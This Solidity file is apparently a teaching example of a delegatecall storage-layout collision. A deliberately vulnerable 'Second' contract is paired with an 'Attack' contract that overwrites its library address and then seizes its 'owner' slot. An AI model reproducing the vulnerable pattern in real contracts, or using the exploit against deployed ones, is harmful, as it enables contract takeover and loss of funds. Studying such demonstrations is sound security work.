// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract First {
    uint256 public number;

    function setNumber(uint256 _number) public {
        number = _number;
    }
}

contract Second {
    address public first;
    address public owner;
    uint256 public number;

    constructor (address _first) {
        first = _first;
        owner = msg.sender;
    }

    function setNumber (uint256 _number) public {
        first.delegatecall(abi.encodeWithSignature("setNumber(uint256)",_number));
    }
}
// Attacker can be owner of Second contract with calling attack function!
contract Attack {
    address public first;
    address public owner;
    uint256 public number;

    Second public second;

    constructor (Second _second) {
        second = Second(_second);
    }

    function setNumber (uint256 _number) public {
        owner = msg.sender;
    }
    
    function attack () public {
        second.setNumber(uint256(uint160(address(this))));
        second.setNumber(3);
    }
}
